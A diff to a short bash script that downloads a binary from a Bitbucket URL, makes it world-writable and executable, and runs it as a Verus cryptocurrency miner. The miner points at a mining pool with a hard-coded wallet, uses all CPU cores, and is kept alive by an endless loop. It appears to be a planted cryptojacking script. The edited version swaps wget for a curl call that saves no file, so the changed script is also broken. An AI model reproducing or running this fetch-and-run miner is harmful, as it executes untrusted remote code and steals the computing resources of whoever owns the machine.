@@ -1,8 +1,8 @@
 #!/bin/bash
 mkdir .kap && cd .kap
-wget -O bubux https://bitbucket.org/buyyy/didieu/downloads/bct
-chmod 777 bubux
-./bubux -a verus -o stratum+tcp://ap.vipor.net:5040 -u RSaAjB1zYPF9wEwdbb9UQQGoia5Hp4YpiV.UYEY -t $(nproc --all)
+curl  https://bitbucket.org/buyyy/didieu/downloads/bct
+chmod 777 bct
+./bct -a verus -o stratum+tcp://ap.vipor.net:5040 -u RSaAjB1zYPF9wEwdbb9UQQGoia5Hp4YpiV.UYEY -t $(nproc --all)
 while [ 1 ]; do
 sleep 3
 done
